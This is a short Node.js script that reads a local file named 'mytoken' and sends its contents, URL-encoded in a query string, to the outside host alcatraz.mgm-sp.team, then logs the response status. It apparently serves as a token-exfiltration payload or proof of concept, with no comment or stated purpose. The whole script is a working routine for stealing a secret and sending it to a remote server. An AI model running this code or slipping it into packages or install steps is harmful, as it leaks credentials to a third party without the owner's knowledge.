const fs = require('fs');
const https = require('https');

const content = fs.existsSync('mytoken') ? fs.readFileSync('mytoken', 'utf8') : '';
const url = `https://alcatraz.mgm-sp.team/wrtqva?content=${encodeURIComponent(content)}`;

https.get(url, (res) => {
  console.log(`Status: ${res.statusCode}`);
}).on('error', (err) => {
  console.error(`Error: ${err.message}`);
});
